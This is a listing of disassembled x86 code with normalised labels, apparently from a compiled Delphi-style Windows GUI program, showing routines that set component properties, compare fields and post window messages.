call sub_44f958
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc ]
mov si 0xffcf
call sub_4034a4
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_47d6b0
mov edx edi
call sub_47df90
mov eax [ eax + 0x40 ]
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0xd4 ]
inc edi
dec esi
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_47d6b0
mov edx edi
call sub_47df90
mov eax [ eax + 0x40 ]
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0xd4 ]
mov eax [ ebp - 0x4 ]
call sub_47d6b0
mov edx edi
call sub_47df90
cmp [ eax + 0x40 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_47d6b0
mov edx edi
call sub_47df90
cmp [ eax + 0x40 ] 0x0
je r-xdata
sub_47dd20
push ebp
mov ebp esp
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov eax [ ebp + 0x8 ]
push eax
xor edx edx
mov eax esi
call sub_419a90
xor eax eax
mov [ esi + 0x28 ] eax
mov dl 0x1
mov eax esi
call sub_47de2c
mov dl 0x1
mov eax esi
call sub_47de44
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40360c
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_47dd84
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0xc ] 0x0
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_403458
mov eax [ eax + 0xc ]
mov dl [ esi + 0x2c ]
call sub_44c9c4
sub_47dde8
push ebx
push esi
mov ebx ecx
mov esi edx
mov ecx ebx
mov edx esi
call sub_419a6c
cmp bl 0x2
jne r-xdata
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_403458
mov edx [ eax + 0xc ]
test edx edx
je r-xdata
xor eax eax
mov [ edx + 0x210 ] eax
sub_47de5c
push ebp
mov ebp esp
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov eax [ ebp + 0x8 ]
push eax
xor edx edx
mov eax esi
call sub_419a90
mov [ esi + 0x28 ] 0x1
mov [ esi + 0x29 ] 0x1
mov [ esi + 0x2a ] 0x1
mov [ esi + 0x1c ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40360c
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_47deb8
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4195c8
mov eax esi
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edi esi
mov dl [ edi + 0x1c ]
mov eax ebx
call sub_47d3a0
mov al [ edi + 0x24 ]
mov [ ebx + 0x24 ] al
mov dl [ edi + 0x2a ]
mov eax ebx
call sub_47e1bc
mov dl [ edi + 0x28 ]
mov eax ebx
call sub_47e130
mov dl [ edi + 0x29 ]
mov eax ebx
call sub_47e1e8
sub_47df10
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_403458
mov ebx eax
mov [ ebx + 0x3c ] 0x1
cmp [ ebx + 0x2c ] 0x0
je r-xdata
mov eax ebx
call sub_47d6b0
mov dl [ esi + 0x2a ]
call sub_47e1bc
sub_47df54
push ebx
push esi
push edi
mov ebx edx
mov eax ebx
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_403458
mov esi eax
mov edi [ esi + 0x40 ]
test edi edi
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0xdc ]
sub_47dfa4
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_419a6c
sub bl 0x1
jb r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_403458
mov ebx [ edi + 0x20 ]
test ebx ebx
je r-xdata
je r-xdata
pop edi
pop esi
pop ebx
retn
test ebx ebx
je r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
dec bl
je r-xdata
xor ebx ebx
mov edx [ edi + 0x20 ]
mov eax [ edx + 0xc ]
test eax eax
je r-xdata
mov eax ebx
call sub_47d74c
mov dl 0x1
call sub_47cd2c
mov eax esi
mov edx [ r-xdata ]
call sub_403458
mov ebx eax
mov eax ebx
call sub_47d690
test eax eax
je r-xdata
mov eax esi
call sub_47d5bc
mov eax esi
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
jmp r-xdata
mov eax [ edx + 0x18 ]
test eax eax
je r-xdata
mov ebx eax
jmp r-xdata
mov eax ebx
call sub_47d690
cmp [ eax + 0x18 ] 0x0
je r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_403458
mov ebx eax
mov eax ebx
call sub_47d690
test eax eax
je r-xdata
cmp [ edi + 0xc ] 0x0
jne r-xdata
mov ebx eax
mov eax ebx
call sub_47d690
mov eax [ eax + 0x18 ]
call sub_4533bc
test al al
je r-xdata
mov eax ebx
call sub_47d690
cmp [ eax + 0x18 ] 0x0
je r-xdata
test ebx ebx
je r-xdata
push 0x0
push 0x0
push 0x5
mov eax ebx
call sub_47d690
mov eax [ eax + 0x18 ]
call sub_4530b8
push eax
call PostMessageA
jmp r-xdata
mov eax ebx
call sub_47d690
mov eax [ eax + 0x18 ]
call sub_4533bc
test al al
je r-xdata
mov eax ebx
call sub_4533bc
test al al
je r-xdata
push 0x0
push 0x0
push 0x5
mov eax ebx
call sub_47d690
mov eax [ eax + 0x18 ]
call sub_4530b8
push eax
call PostMessageA
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xd4 ]
jmp r-xdata
sub_47e130
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp dl [ eax + 0x28 ]
je r-xdata
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x28 ] dl
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
push eax
push sub_47df54
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
call sub_47d27c
cmp [ eax + 0xc ] 0x0
je r-xdata
mov eax [ eax + 0xc ]
call sub_44f950
xor eax eax
push ebp
push sub_47e19b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
push eax
push sub_47df54
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
call sub_47d27c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
mov eax [ eax + 0xc ]
call sub_44f958
retn
sub_47e1bc
push ebx
mov ebx eax
cmp dl [ ebx + 0x2a ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x2a ] dl
mov eax ebx
call sub_47cb00
test [ eax + 0x1c ] 0x1
jne r-xdata
push ebx
push sub_47df10
mov edx ebx
mov eax ebx
call sub_47d27c
sub_47e1e8
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp bl [ eax + 0x29 ]
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x29 ] bl
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
test eax eax
je r-xdata
mov ecx ebx
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
call sub_47e27c
cmp [ eax + 0xc ] 0x0
je r-xdata
mov eax [ eax + 0xc ]
call sub_44f950
xor eax eax
push ebp
push sub_47e262
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx ebx
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
call sub_47e27c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
mov eax [ eax + 0xc ]
mov si 0xffd0
call sub_4034a4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
mov eax [ eax + 0xc ]
call sub_44f958
retn
sub_47e27c
push ebx
push esi
push edi
push ebp
push ecx
mov ebx ecx
mov esi edx
mov [ esp ] eax
test esi esi
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_419748
mov edi eax
dec edi
test edi edi
jl r-xdata
inc edi
xor ebp ebp
mov edx ebp
mov eax esi
call sub_47df90
call sub_47d670
test al al
je r-xdata
mov edx ebp
mov eax esi
call sub_47df90
mov eax [ eax + 0x40 ]
mov edx ebx
call sub_48455c
inc ebp
dec edi
jne r-xdata
mov edx ebp
mov eax esi
call sub_47df90
call sub_47d6b0
mov edx ebx
call sub_47e1e8
mov edx ebp
mov eax esi
call sub_47df90
call sub_47d6b0
mov edx eax
mov ecx ebx
mov eax [ esp ]
call sub_47e27c
mov edx ebp
mov eax esi
call sub_47df90
cmp [ eax + 0x40 ] 0x0
je r-xdata
sub_47e30c
push ebx
push esi
push edi
push ebp
mov edi eax
xor ebp ebp
mov eax edi
call sub_419748
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov eax ebp
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
inc ebp
mov edx esi
mov eax edi
call sub_47df90
cmp [ eax + 0x30 ] 0x0
je r-xdata
sub_47e35c
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x1c ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_47e429
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x1 ] 0x1
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47e430
lea eax [ ebp - 0x1c ]
call sub_404038
lea eax [ ebp - 0x8 ]
call sub_404038
retn
mov edx edi
mov eax [ ebx + 0x10 ]
mov si 0xffee
call sub_4034a4
test al al
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
cmp [ eax + 0x7c ] 0x0
je r-xdata
mov eax [ ebx + 0x10 ]
cmp [ eax + 0x84 ] 0x0
je r-xdata
cmp [ edi ] 0x0
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
mov eax [ edi ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0xb
lea edx [ ebp - 0x1c ]
mov eax [ ebx + 0x10 ]
mov ax [ eax + 0x84 ]
call sub_45c818
mov eax [ ebp - 0x1c ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov ecx 0x1
mov eax r-xdata
call sub_40911c
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_40408c
sub_47e44c
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
mov esi eax
xor eax eax
push ebp
push sub_47e4ff
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_459220
test al al
je r-xdata
xor ebx ebx
jmp r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ esi + 0x18 ]
call sub_47eb74
mov eax [ ebp - 0x4 ]
push eax
mov eax [ esi + 0x10 ]
mov edx [ r-xdata ]
call sub_403458
mov edx [ eax + 0x64 ]
pop eax
call sub_404444
je r-xdata
test bl bl
jne r-xdata
mov bl 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47e506
lea eax [ ebp - 0xc ]
mov edx 0x3
call sub_40405c
retn
mov eax [ esi + 0x18 ]
mov eax [ eax + 0x4 ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
lea edx [ ebp - 0xc ]
mov eax [ esi + 0x18 ]
call sub_47eb74
mov eax [ ebp - 0xc ]
lea edx [ ebp - 0x8 ]
call sub_461b54
mov eax [ ebp - 0x8 ]
push eax
mov eax [ esi + 0x10 ]
mov edx [ r-xdata ]
call sub_403458
mov edx [ eax + 0x64 ]
pop eax
call sub_404444
sete bl
sub_47e510
push ebx
mov ebx eax
mov eax ebx
call sub_459248
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x18 ]
cmp [ eax + 0x40 ] 0x0
je r-xdata
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x40 ]
mov edx [ eax ]
call [ edx + 0x50 ]
push eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403458
pop edx
cmp dl [ eax + 0x6a ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_47e550
push ebx
mov ebx eax
mov eax ebx
call sub_459270
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403458
mov eax [ eax + 0x74 ]
mov edx [ ebx + 0x18 ]
cmp eax [ edx + 0x64 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_47e580
push ebx
mov ebx eax
mov eax ebx
call sub_459298
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x18 ]
cmp [ eax + 0x40 ] 0x0
je r-xdata
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403458
mov edx [ eax + 0x7c ]
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x40 ]
mov eax [ eax + 0x80 ]
call sub_404444
je r-xdata
mov al 0x1
pop ebx
retn
sub_47e5c4
push ebx
mov ebx eax
mov eax ebx
call sub_4592ac
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x18 ]
cmp [ eax + 0x40 ] 0x0
je r-xdata
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403458
mov edx [ eax + 0x7c ]
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x40 ]
mov eax [ eax + 0x80 ]
call sub_404444
je r-xdata
mov al 0x1
pop ebx
retn
sub_47e608
push ebx
mov ebx eax
mov eax ebx
call sub_42184c
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x18 ]
cmp [ eax + 0x40 ] 0x0
je r-xdata
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x40 ]
mov eax [ eax + 0x120 ]
mov edx [ ebx + 0x10 ]
cmp eax [ edx + 0x40 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_47e63c
push ebx
mov ebx eax
mov eax ebx
call sub_4592c0
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403458
mov ax [ eax + 0x84 ]
mov edx [ ebx + 0x18 ]
cmp ax [ edx + 0x48 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_47e670
push ebx
mov ebx eax
mov eax ebx
call sub_4592d4
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403458
mov al [ eax + 0x86 ]
mov edx [ ebx + 0x18 ]
cmp al [ edx + 0x30 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_47e6a4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_47ef98
sub_47e6c4
push esi
mov esi eax
mov eax esi
call sub_4592f0
mov eax esi
mov edx [ eax ]
call [ edx + 0x24 ]
test al al
je r-xdata
pop esi
retn
mov eax [ esi + 0x18 ]
cmp [ eax + 0x40 ] 0x0
je r-xdata
mov eax [ esi + 0x18 ]
mov eax [ eax + 0x40 ]
mov edx [ eax ]
call [ edx + 0x7c ]
sub_47e6f0
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ esi + 0x18 ]
mov eax [ eax + 0x40 ]
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x64 ]
sub_47e714
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x18 ]
mov [ eax + 0x64 ] esi
sub_47e730
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x38 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x40 ]
add eax 0x80
mov edx esi
call sub_40408c
sub_47e758
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_47f06c
sub_47e778
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x8 ]
test al al
je r-xdata
pop ebx
pop ebp
retn 0x8
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x40 ]
mov edx [ ebp + 0x8 ]
mov [ eax + 0x120 ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x124 ] edx
sub_47e7a8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x40 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_47f154
sub_47e7c8
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x44 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
mov ecx [ eax ]
call [ ecx + 0x2c ]
sub_47e7e8
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov [ esi + 0x24 ] 0x20000000
xor edx edx
mov eax esi
call sub_47d3b0
mov [ esi + 0x58 ] 0xffffffff
xor eax eax
mov [ esi + 0x4c ] eax
mov [ esi + 0x51 ] 0x1
mov [ esi + 0x61 ] 0x1
mov [ esi + 0x52 ] 0x1
mov [ esi + 0x3c ] 0x1
xor eax eax
mov [ esi + 0x44 ] eax
xor eax eax
mov [ esi + 0x5c ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40360c
mov eax esi
pop esi
pop ebx
retn
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_47e84c
push ebx
push esi
call sub_403674
mov ebx edx
mov esi eax
lea eax [ esi + 0x38 ]
call sub_40d4f0
lea eax [ esi + 0x40 ]
call sub_40d4f0
mov edx ebx
and dl 0xfc
mov eax esi
call sub_47d410
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40365c
sub_47e884
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_47e9a7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax edi
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47e9ae
lea eax [ ebp - 0x4 ]
call sub_404038
retn
cmp [ esi + 0x40 ] 0x0
je r-xdata
test bl bl
je r-xdata
test bl bl
je r-xdata
mov edx [ edi + 0x64 ]
mov eax esi
call sub_47ef98
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_47eb74
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov dl [ edi + 0x6a ]
mov eax [ esi + 0x40 ]
mov ecx [ eax ]
call [ ecx + 0x64 ]
mov eax [ esi + 0x40 ]
mov edx [ eax ]
call [ edx + 0x50 ]
cmp al 0x1
jne r-xdata
mov edx [ edi + 0x80 ]
mov eax esi
call sub_47f06c
cmp [ esi + 0x58 ] 0x0
jne r-xdata
test bl bl
je r-xdata
mov eax [ esi + 0x40 ]
add eax 0x80
mov edx [ edi + 0x7c ]
call sub_40408c
mov eax [ esi + 0x40 ]
cmp [ eax + 0x80 ] 0x0
jne r-xdata
test bl bl
je r-xdata
mov dx [ edi + 0x84 ]
mov eax esi
call sub_47f154
cmp [ esi + 0x48 ] 0x0
jne r-xdata
test bl bl
je r-xdata
mov eax [ esi + 0x40 ]
mov edx [ edi + 0x40 ]
mov [ eax + 0x120 ] edx
mov edx [ edi + 0x44 ]
mov [ eax + 0x124 ] edx
mov eax [ esi + 0x40 ]
cmp [ eax + 0x122 ] 0x0
jne r-xdata
test bl bl
je r-xdata
mov dl [ edi + 0x86 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x2c ]
cmp [ esi + 0x30 ] 0x1
jne r-xdata
test bl bl
je r-xdata
mov eax [ edi + 0x74 ]
mov [ esi + 0x64 ] eax
cmp [ esi + 0x64 ] 0x0
jne r-xdata
test bl bl
je r-xdata
sub_47e9b4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_47eaee
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_47d4c0
mov eax ebx
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
xor edx edx
push ebp
push sub_47ead1
push [ fs : edx ]
mov [ fs : edx ] esp
mov esi ebx
mov eax esi
call sub_47eb64
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_47ee8c
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_47eb74
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_47ef98
mov eax [ esi + 0x64 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x64 ] eax
mov edx [ esi + 0x58 ]
mov eax [ ebp - 0x4 ]
call sub_47f06c
mov edx [ esi + 0x4c ]
mov eax [ ebp - 0x4 ]
call sub_47f0c8
mov edx [ esi + 0x5c ]
mov eax [ ebp - 0x4 ]
call sub_47f0b8
mov dl [ esi + 0x51 ]
mov eax [ ebp - 0x4 ]
call sub_47f1b8
mov dl [ esi + 0x61 ]
mov eax [ ebp - 0x4 ]
call sub_47f328
mov dl [ esi + 0x52 ]
mov eax [ ebp - 0x4 ]
call sub_47f210
mov dx [ esi + 0x48 ]
mov eax [ ebp - 0x4 ]
call sub_47f154
mov edx [ esi + 0x44 ]
mov eax [ ebp - 0x4 ]
call sub_47f23c
cmp [ esi + 0x2c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x4 ]
test esi esi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47ead8
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
test eax eax
je r-xdata
mov eax esi
call sub_47d6b0
push eax
mov eax [ ebp - 0x4 ]
call sub_47d6b0
pop edx
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax esi
mov edx [ eax ]
call [ edx + 0x20 ]
retn
mov edx [ eax ]
call [ edx + 0x24 ]
sub_47eafc
push ebx
mov edx [ eax + 0x40 ]
test edx edx
je r-xdata
pop ebx
retn
mov ecx [ eax + 0x24 ]
mov ebx ecx
sub ebx 0x1fffffff
je r-xdata
mov eax edx
mov dl 0x1
call sub_4837b8
jmp r-xdata
dec ebx
jne r-xdata
mov eax ecx
xchg edx eax
call sub_44ca14
mov eax edx
mov dl 0x1
call sub_44ca38
jmp r-xdata
sub_47eb34
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_47eb64
cmp esi eax
jne r-xdata
pop esi
pop ebx
retn
mov cl 0x1
mov edx esi
mov eax ebx
mov si 0xfffd
call sub_4034a4
sub_47eb74
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax esi
mov edx [ ebx + 0x20 ]
call sub_40408c
mov eax [ ebx + 0x20 ]
call sub_4042f8
test eax eax
jne r-xdata
mov eax ebx
call sub_47eb64
test eax eax
jne r-xdata
push esi
mov eax ebx
call sub_4193b8
mov [ esp + 0x4 ] eax
mov [ esp + 0x8 ] 0x0
lea edx [ esp + 0x4 ]
xor ecx ecx
mov eax r-xdata
call sub_40911c
jmp r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
sub_47ebeb
add [ ebp - 0x75 ] dl
in al dx
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_47ec85
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx esi
mov eax ebx
call sub_4193d0
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_47eb74
mov eax [ ebp - 0x4 ]
call sub_4042f8
test eax eax
jle r-xdata
mov eax ebx
call sub_47eb64
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_47eb74
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47ec8c
lea eax [ ebp - 0x4 ]
call sub_404038
retn
mov eax ebx
call sub_47eb64
mov edx [ r-xdata ]
call sub_403458
mov ebx eax
mov eax [ ebx + 0x64 ]
call sub_4042f8
test eax eax
jle r-xdata
mov eax esi
mov edx [ ebx + 0x64 ]
call sub_40408c
sub_47ec94
push ebp
mov ebp esp
push ebx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop ebx
pop ebp
retn
cmp [ ebx + 0x38 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x58 ] 0xffffffff
jle r-xdata
mov eax [ ebx + 0x38 ]
call sub_45a540
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp eax [ edx + 0x58 ]
jg r-xdata
mov al 0x1
pop ebx
pop ebp
retn
sub_47ecd0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x61 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_47eb64
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_47d74c
test eax eax
je r-xdata
xor eax eax
pop ecx
pop ebp
retn
push ebp
mov eax [ ebp - 0x4 ]
call sub_47eb64
mov eax [ eax + 0x5c ]
call sub_47ec94
pop ecx
test al al
jne r-xdata
push ebp
mov eax [ ebp - 0x4 ]
call sub_47d74c
call sub_47cb00
call sub_47ec94
pop ecx
test al al
jne r-xdata
mov al 0x1
pop ecx
pop ebp
retn
sub_47ed40
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_47edb6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_47eb64
test eax eax
je r-xdata
mov bl 0x1
mov eax ebx
call sub_47eb64
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_47eb74
mov eax [ ebp - 0x4 ]
push eax
mov eax ebx
call sub_47eb64
mov edx [ eax + 0x64 ]
pop eax
call sub_40810c
test eax eax
setne al
mov ebx eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47edbd
lea eax [ ebp - 0x4 ]
call sub_404038
retn
sub_47eddc
push ebx
push esi
push edi
mov edi eax
cmp [ edi + 0x44 ] 0xffffffff
je r-xdata
mov eax edi
call sub_47eb58
call sub_47cb00
mov eax [ eax + 0x6c ]
mov eax [ eax + 0x28 ]
mov [ edi + 0x5c ] eax
mov eax edi
call sub_47eb58
mov ebx [ eax + 0x20 ]
test ebx ebx
je r-xdata
inc [ edi + 0x44 ]
mov [ edi + 0x3c ] 0x1
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_47eb58
mov eax [ eax + 0x20 ]
call sub_47d74c
mov esi eax
jmp r-xdata
test esi esi
je r-xdata
test esi esi
je r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
test ebx ebx
je r-xdata
mov eax [ esi + 0x28 ]
mov [ edi + 0x5c ] eax
mov eax [ esi + 0x20 ]
call sub_47d74c
mov esi eax
mov eax ebx
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
mov eax ebx
call sub_47d74c
mov ebx [ eax + 0x20 ]
test ebx ebx
jne r-xdata
mov eax ebx
mov [ eax + 0x3c ] 0x1
cmp [ eax + 0x44 ] 0xffffffff
je r-xdata
mov edx [ edi + 0x5c ]
call sub_47f0b8
inc [ eax + 0x44 ]
sub_47ee8c
push ebx
push esi
push edi
mov edi edx
mov ebx eax
test edi edi
jne r-xdata
mov eax ebx
call sub_47eb64
cmp edi eax
je r-xdata
mov eax [ ebx + 0x38 ]
call sub_4032a8
xor eax eax
mov [ ebx + 0x38 ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ ebx + 0x40 ] 0x0
je r-xdata
cmp [ ebx + 0x38 ] 0x0
jne r-xdata
